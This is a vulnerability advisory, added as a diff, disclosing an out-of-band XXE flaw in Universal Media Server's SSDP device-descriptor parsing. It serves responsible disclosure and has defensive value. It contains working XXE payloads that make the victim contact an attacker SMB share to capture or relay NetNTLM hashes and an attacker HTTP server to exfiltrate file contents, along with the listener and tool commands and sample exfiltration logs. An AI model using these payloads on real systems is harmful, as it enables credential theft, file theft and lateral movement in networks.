@@ -1,0 +1,139 @@
+Issue: Out-of-Band XXE in Universal Media Server's SSDP Processing
+Reserved CVE: CVE-2018-13416
+
+# Vulnerability Overview
+The XML parsing engine for Universal Media Server's SSDP/UPNP functionality is vulnerable to an XML External Entity Processing (XXE) attack. Unauthenticated attackers on the same LAN can use this vulnerability to:
+
+- Access arbitrary files from the filesystem with the same permission as the user account running UMS.
+- Initiate SMB connections to capture NetNTLM challenge/response and crack to clear-text password.
+- Initiate SMB connections to relay NetNTLM challenge/response and achieve Remote Command Execution in Windows domains.
+
+Exploitation can be demonstrated using evil-ssdp (https://gitlab.com/initstring/evil-ssdp).
+
+# Discovered By
+Chris Moberly @ The Missing Link Security
+
+# Vendor Status
+UMS team responded to notification within an hour, patch in progress.
+
+# Vulnerability Details
+Atack type: Remote, unauthenticated
+Impact: Information disclosure up to code execution
+Affected component: UMS's SSDP discovery / XML parsing
+Operating Systems affected: Verified Windows 10 (likely all versions)
+UMS version affected: Tested on 7.1.0 (current as of July 2018). Older versions likely also vulnerable.
+Attack vector: XXE
+
+# Technical Overview
+UMS, like many other media servers, will attempt to discover other devices on a local network. The discovery process is handled by Simple Service Discovery Protocol (SSDP), which sends a UDP multicast out to 239.255.255.250 on port 1900. This is the first step in finding and adding Universal Plug and Play (UPNP) devices.
+
+We can reply to that UDP multicast directly on the same port that the request initiated from, informing this client that we have a shared device. When we do this, we provide the location of an XML file containing more information about our device. This is called a Device Descriptor.
+
+UMS will automatically access the Device Descriptor over HTTP, parsing the XML content. This is expected behaviour for SSDP/UPNP.
+
+By hosting a specially crafted XML file at that location, we can force UMS to do several things. The POC used to prove this vulnerability (POC 1 below) contained the following XML content:
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file://///$smbServer/smb/hash.jpg" >
+<!ENTITY xxe-url SYSTEM "http://$localIp:$localPort/ssdp/xxe.html" >
+]>
+<hello>&xxe;&xxe-url;</hello>
+<root>
+    <specVersion>
+        <major>1</major>
+        <minor>0</minor>
+    </specVersion>
+    <device>
+```
+
+When UMS parses this, it does two things:
+
+1. Accesses the SMB share running at the $smbServer variable. This allows us to collect or relay the NetNTLM challenge/response.
+2. Accesses an HTTP server at the $localIp variable. This is used for verification purposes while testing the vulnerability.
+
+The unexpected behaviour here is the ability to provide the `ENTITY` tags, forcing UMS to automatically access file paths and HTTP URLs.
+
+# POC 1: Capcturing NetNTLM Challenge/Response
+This is a common attack method inside a Windows domain, where compromising an account can assist with moving laterally through the network.
+
+This vulnerability can be easily validated using the [evil-ssdp tool found here](https://gitlab.com/initstring/evil-ssdp).
+
+The process is:
+
+1. Execute the evil-ssdp tool as follows from a Linux host:
+
+```
+essdp.py eth0 -t xxe-smb    # instructs tool to use the 'xxe' template for zero-day hunting
+```
+
+2. From the same Linux host, either launch a simple netcat listener like this:
+
+```
+sudo nc -nlvp 445
+```
+
+or use Impacket to listen and extract the NetNTLM challenge/response as follows:
+
+```
+sudo python examples/smbserver.py smb /tmp/smb/
+```
+
+3. From a Windows host on the same network, simply restart UMS. evil-ssdp will display messages like the following:
+
+```
+[XML REQUEST]  Host: 10.0.200.10, User-Agent: UMS/7.1.0 Windows10/10.0 UPnP/1.0 Cling/2.0
+               GET /ssdp/device-desc.xml
+```
+
+When that happens, either the netcat listener or the Impacket SMB server will receive the connection. If using Impacket, you will now have the NetNTLM challenge/response of the user running UMS. This can be cracked to clear-text using tools like Hashcat. Alternatively, you can use Impacket to relay that hash to another machine on the network, achieving remote code execution.
+
+# POC 2: Accessing Arbitrary Files
+If an attacker knows specifically what files they are looking for, this same vulnerability can be used to extract that information. Essentially, an XML entity will be defined as a variable, storing the output of a file on the machine where UMS is installed. Then, an HTTP request will be sent to the attacker's machine that includes that variable. The attacker will be able to see this file in their HTTP server logs.
+
+We need two files hosted on the attacking server to do this. The initial Device Descriptor sent is:
+
+```
+<!DOCTYPE data[
+<!ENTITY % file SYSTEM "file:///C:/users/public/pwned.txt">
+<!ENTITY % dtd SYSTEM "http://$localIp:$localPort/ssdp/data.dtd">
+%dtd;
+]>
+<data>&send;</data>
+```
+
+Which triggers another connection request to the following data.dtd file:
+
+```
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://$localIp:$localPort/?exfiltrated=%file;'>">
+%all;
+```
+
+We can also verify this using the evil-ssdp tool, using the 'xxe-exfil' template. For this POC, only extraction of 1-line files was found to be possible.
+
+To reproduce:
+
+1. Create a test file 'C:\Users\Public\pwned.txt' on the Windows hosts where UMS is installed. Please 1 line of text with no whitespaces inside, like this:
+
+```
+secretstuff!
+```
+
+2. Execute the evil-ssdp tool as follows from a Linux host on the same network:
+
+```
+essdp.py eth0 -t xxe-exfil    # instructs tool to use the 'xxe-exfil' template for zero-day hunting
+```
+
+3. Back on the Windows host, simply restart UMS. evil-ssdp will display messages like the following
+
+```
+[XML REQUEST]  Host: 10.0.200.10, User-Agent: UMS/7.1.0 Windows10/10.0 UPnP/1.0 Cling/2.0
+               GET /ssdp/device-desc.xml
+[XXE VULN!!!!] Host: 10.0.200.10, User-Agent: Java/1.8.0_171
+               GET /ssdp/data.dtd
+[EXFILTRATION] Host: 10.0.200.10, User-Agent: Java/1.8.0_171
+               GET /?exfiltrated=secretstuff!
+```
